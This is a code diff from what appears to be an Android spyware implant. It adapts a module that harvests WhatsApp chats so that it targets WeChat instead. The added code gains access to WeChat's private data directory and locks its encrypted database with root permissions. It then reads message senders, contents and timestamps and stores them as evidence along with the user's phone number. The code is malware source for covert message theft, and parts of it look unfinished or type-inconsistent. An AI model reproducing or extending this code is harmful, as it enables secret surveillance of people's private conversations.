@@ -27,18 +27,19 @@ import com.android.networking.db.RecordVisitor;
 import com.android.networking.file.Path;
 import com.android.networking.module.ModuleAddressBook;
 import com.android.networking.util.Check;
+import com.android.networking.util.ExecuteResult;
 import com.android.networking.util.StringUtils;
 
-public class ChatWhatsapp extends SubModuleChat {
-	private static final String TAG = "ChatWhatsapp";
+public class ChatWeChat extends SubModuleChat {
+	private static final String TAG = "ChatWeChat";
 
-	ChatGroups groups = new ChatWhatsappGroups();
+	//ChatGroups groups = new ChatWhatsappGroups();
 
 	Hashtable<String, Integer> hastableConversationLastIndex = new Hashtable<String, Integer>();
-	private static final int PROGRAM = 0x06;
+	private static final int PROGRAM = 0x0a;
 
 	private static final String DEFAULT_LOCAL_NUMBER = "local";
-	String pObserving = "whatsapp";
+	String pObserving = "wechat";
 
 	private String myPhoneNumber = "local";
 	Semaphore readChatSemaphore = new Semaphore(1, true);
@@ -60,7 +61,7 @@ public class ChatWhatsapp extends SubModuleChat {
 		}
 
 		try {
-			readChatWhatsappMessages();
+			readChatWeChatMessages();
 		} catch (IOException e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notifyStopProgram) Error: " + e);
@@ -83,12 +84,12 @@ public class ChatWhatsapp extends SubModuleChat {
 		try {
 			myPhoneNumber = readMyPhoneNumber();
 			
-			if (DEFAULT_LOCAL_NUMBER.equals(myPhoneNumber)) {
+			/*if (DEFAULT_LOCAL_NUMBER.equals(myPhoneNumber)) {
 				enabled = false;
 				return;
-			}
+			}*/
 
-			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WHATSAPP, myPhoneNumber);
+			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WECHAT, myPhoneNumber);
 
 			if (markup.isMarkup()) {
 				hastableConversationLastIndex = (Hashtable<String, Integer>) markup.readMarkupSerializable();
@@ -105,7 +106,7 @@ public class ChatWhatsapp extends SubModuleChat {
 					Check.log(TAG + " (actualStart), get all Chats");
 				}
 
-				readChatWhatsappMessages();
+				readChatWeChatMessages();
 			}
 
 		} catch (Exception e) {
@@ -118,25 +119,7 @@ public class ChatWhatsapp extends SubModuleChat {
 
 	private String readMyPhoneNumber() {
 		// f_d=/data/data/com.whatsapp/shared_prefs/RegisterPhone.xml
-		/*
-		 * <?xml version='1.0' encoding='utf-8' standalone='yes' ?> <map>
-		 * <string
-		 * name="com.whatsapp.RegisterPhone.phone_number">3938980634</string>
-		 * <int name="com.whatsapp.RegisterPhone.country_code_position"
-		 * value="-1" /> <boolean name="com.whatsapp.RegisterPhone.no_self_send"
-		 * value="false" /> <int
-		 * name="com.whatsapp.RegisterPhone.verification_state" value="14" />
-		 * <int name="com.whatsapp.RegisterPhone.phone_number_position"
-		 * value="10" /> <string
-		 * name="com.whatsapp.RegisterPhone.input_country_code">39</string>
-		 * <string name="com.whatsapp.RegisterPhone.input_phone_number">393 898
-		 * 0634</string> <string
-		 * name="com.whatsapp.RegisterPhone.prev_country_code">39</string>
-		 * <string name="com.whatsapp.RegisterPhone.country_code">39</string>
-		 * <string
-		 * name="com.whatsapp.RegisterPhone.prev_phone_number">3938980634
-		 * </string> </map>
-		 */
+
 
 		String filename = Messages.getString("f_d");
 		try {
@@ -193,7 +176,7 @@ public class ChatWhatsapp extends SubModuleChat {
 	 * 
 	 * @throws IOException
 	 */
-	private void readChatWhatsappMessages() throws IOException {
+	private void readChatWeChatMessages() throws IOException {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (readChatMessages)");
 		}
@@ -202,28 +185,56 @@ public class ChatWhatsapp extends SubModuleChat {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (readChatMessages), semaphore red");
 			}
+			
 			return;
 		}
 
 		try {
-			boolean updateMarkup = false;
-
-			// f.0=/data/data/com.whatsapp/databases
-			String dbDir = Messages.getString("f_0");
-			// f.1=/msgstore.db
-			String dbFile = Messages.getString("f_1");
-
+			boolean updateMarkup = false;	
+			String dbEncFile = "EnMicroMsg.db";
+			String dbFile = "MicroMsg.db";
+			String dbDir = "";
+			
+			// Get DB Dir
+			Path.unprotect("/data/data/com.tencent.mm/MicroMsg/");
+			
+			// Not the cleanest solution, we should figure out how the hash is generated
+			File fList = new File("/data/data/com.tencent.mm/MicroMsg/");
+			File[] files = fList.listFiles();
+			
+			for (File f : files) {
+				// Database directory is an md5 hash name "671d5d475506b864194891d6a4d018e3"
+			    if (f.isDirectory() && f.getName().length() == 32) {
+			    	dbDir = f.getName();
+					break;
+			    }
+			}
+			
+			if (dbDir.length() == 0) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (readChatWhatsappMessages): Database directory not found"); //$NON-NLS-1$
+				}
+				
+				return;
+			}
+			
+			// Lock encrypted DB
+			dbDir = "/data/data/com.tencent.mm/MicroMsg/" + dbDir + "/";
+			
+			// chmod 000, chown root:root
+			Path.lock(dbDir + dbEncFile);
+			
 			if (Path.unprotect(dbDir, dbFile, true)) {
-
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (readChatMessages): can read DB");
 				}
+				
 				GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
 				SQLiteDatabase db = helper.getReadableDatabase();
 
 				// retrieve a list of all the conversation changed from the last
 				// reading. Each conversation contains the peer and the last id
-				ArrayList<Pair<String, Integer>> changedConversations = fetchChangedConversation(db);
+				ArrayList<Pair<Integer, Integer>> changedConversations = fetchChangedConversation(db);
 
 				// for every conversation, fetch and save message and update
 				// markup
@@ -231,9 +242,9 @@ public class ChatWhatsapp extends SubModuleChat {
 					String conversation = pair.first;
 					int lastReadIndex = pair.second;
 
-					if (groups.isGroup(conversation) && !groups.hasMemoizedGroup(conversation)) {
+					/*if (groups.isGroup(conversation) && !groups.hasMemoizedGroup(conversation)) {
 						fetchGroup(db, conversation);
-					}
+					}*/
 
 					int newLastRead = fetchMessages(db, conversation, lastReadIndex);
 
@@ -267,7 +278,7 @@ public class ChatWhatsapp extends SubModuleChat {
 		}
 	}
 
-	private void fetchGroup(SQLiteDatabase db, final String conversation) {
+	/*private void fetchGroup(SQLiteDatabase db, final String conversation) {
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (fetchGroup) : " + conversation);
@@ -299,7 +310,7 @@ public class ChatWhatsapp extends SubModuleChat {
 		// f_a = messages
 		helper.traverseRecords(Messages.getString("f_a"), visitor);
 
-	}
+	}*/
 
 	/**
 	 * Retrieves the list of the conversations and their last read message.
@@ -307,41 +318,32 @@ public class ChatWhatsapp extends SubModuleChat {
 	 * @param db
 	 * @return
 	 */
-	private ArrayList<Pair<String, Integer>> fetchChangedConversation(SQLiteDatabase db) {
+	private ArrayList<Pair<Integer, Integer>> fetchChangedConversation(SQLiteDatabase db) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (fetchChangedConversation)");
 		}
 
-		ArrayList<Pair<String, Integer>> changedConversations = new ArrayList<Pair<String, Integer>>();
-
-		// CREATE TABLE chat_list (_id INTEGER PRIMARY KEY AUTOINCREMENT,
-		// key_remote_jid TEXT UNIQUE, message_table_id INTEGER)
+		ArrayList<Pair<Integer, Integer>> changedConversations = new ArrayList<Pair<Integer, Integer>>();
 
 		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
-		// f.3=chat_list
-		queryBuilderIndex.setTables(Messages.getString("f_3"));
-		// queryBuilder.appendWhere(inWhere);
-		// f.4=_id
-		// f.5=key_remote_jid
-		// f.6=message_table_id
-		String[] projection = { Messages.getString("f_4"), Messages.getString("f_5"), Messages.getString("f_6") };
+		queryBuilderIndex.setTables("message");
+		String[] projection = { "createTime", "talker", "content" };
 		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);
 
 		// iterate conversation indexes
 		while (cursor != null && cursor.moveToNext()) {
-			// f.5=key_remote_jid
-			String jid = cursor.getString(cursor.getColumnIndexOrThrow(Messages.getString("f_5")));
-			// f.6=message_table_id
-			int mid = cursor.getInt(cursor.getColumnIndexOrThrow(Messages.getString("f_6")));
+			int createTime = cursor.getInt(cursor.getColumnIndexOrThrow("createTime"));
+			
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (readChatMessages): jid : " + jid + " mid : " + mid);
+				Check.log(TAG + " (readChatMessages): createTime : " + createTime);
 			}
 
 			int lastReadIndex = 0;
 			// if conversation is known, get the last read index
-			if (hastableConversationLastIndex.containsKey(jid)) {
-
-				lastReadIndex = hastableConversationLastIndex.get(jid);
+			
+			if (hastableConversationLastIndex.containsKey(createTime)) {
+				lastReadIndex = hastableConversationLastIndex.get(createTime);
+				
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (fetchChangedConversation), I have the index: " + lastReadIndex);
 				}
@@ -349,12 +351,13 @@ public class ChatWhatsapp extends SubModuleChat {
 
 			// if there's something new, fetch new messages and update
 			// markup
-			if (lastReadIndex < mid) {
-				changedConversations.add(new Pair<String, Integer>(jid, lastReadIndex));
+			if (lastReadIndex < createTime) {
+				changedConversations.add(new Pair<Integer, Integer>(createTime, lastReadIndex));
 			}
 
 		}
 		cursor.close();
+		
 		return changedConversations;
 	}
 
@@ -435,14 +438,14 @@ public class ChatWhatsapp extends SubModuleChat {
 			// to = groups.getGroupTo(from, peer);
 			// }
 
-			if (groups.isGroup(peer)) {
+			/*if (groups.isGroup(peer)) {
 				if (incoming) {
 					from = remote;
 				} else {
 					// to = groups.getGroupTo(from, peer);
 				}
 				to = groups.getGroupTo(from, peer);
-			}
+			}*/
 
 			if (to != null && from != null && message != null) {
 				messages.add(new MessageChat(PROGRAM, new Date(timestamp), from, to, message, incoming));
